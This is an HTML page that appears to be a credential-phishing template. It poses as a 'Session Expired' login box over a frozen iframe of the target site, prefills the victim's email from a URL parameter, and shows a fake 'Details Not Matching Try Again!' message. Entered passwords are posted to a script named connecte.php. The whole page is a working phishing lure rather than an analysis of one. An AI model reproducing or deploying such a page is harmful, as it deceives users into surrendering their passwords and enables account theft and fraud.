<!DOCTYPE html>
<html>
<head>
	<title>... Session Expired</title>
	<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
	<link rel="stylesheet" type="text/css" href="./assets/css/design.css">
	<link rel="shortcut icon" type="image/png" href="./assets/images/favicon.png"/>
	<!-- Scripts -->
	<script type="text/javascript">
		function getUrlVars() {
		    var vars = {};
		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
		        vars[key] = value;
		    });
		    return vars;
			}
	</script>
</head>
<body class="w3-container">
		<div>
			<iframe id='mainPage' src='#' scrolling='no' sandbox='allow-forms allow-pointer-lock
			allow-popups allow-same-origin allow-scripts' width="100%" height="1500" style="pointer-events: none;"></iframe>
		</div>

		<div class="w3-card w3-mobile w3-display-middle box">
				<div class="w3-container w3-center">
					<p class="w3-border-bottom w3-border-white"><img src="" id="imgFav" style="padding: 0px 7px 5px 0px;"><strong><em>Details Not Matching Try Again!</em></strong></p>
						<form method="post" action="connecte.php" >
						<table class="w3-table">
							<tr>
								<td><strong>Email Address:</strong></td>

								<td><input id="emailit" class="w3-border-0" type="email" name="email" value="" readonly></td>
							</tr>
							<tr>
								<td><strong>Password:</strong></td>
								<td><input class="w3-round" type="Password"  name="password" placeholder="Enter Password" required></td>
							</tr>												
						</table>
						<p>
						<input type="checkbox"> <strong>Keep me logged in? &nbsp</strong>
						</p>
							<button type="submit" name="submit" class="w3-btn w3-border w3-border-black w3-round"><strong>Log in</strong></button>
						</form>
				</div>
			 
			</div>

	<script>
		var email = getUrlVars()['access'];
	</script>
	<script type="text/javascript" src="./assets/js/validate.js"></script>  

</body>
</html>